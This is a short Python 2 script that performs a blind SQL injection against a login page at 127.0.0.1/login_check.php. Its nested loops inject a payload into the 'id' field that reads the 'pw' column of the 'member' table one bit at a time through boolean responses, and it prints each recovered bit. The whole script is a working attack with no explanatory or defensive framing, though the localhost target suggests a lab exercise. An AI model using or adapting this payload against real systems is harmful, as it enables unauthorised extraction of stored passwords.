__author__ = 'creator'

#version 2.7

import urllib, urllib2


i=0
j=0


for i in range(1,20):
    for j in range(1,9):
        i=str(i)
        j=str(j)
        url = "http://127.0.0.1/login_check.php"
        data = urllib.urlencode({'id': "'or (select substr(LPAD(bin(ord(substr(pw,"+j+", 1))),8,0),"+i+",1) from member )#", "pw":"admin1234"})


        req = urllib2.Request(url, data)
        res = urllib2.urlopen(req)

        if(res.read()):
            print '0'
        else:
            print '1'

        print "--------------------"
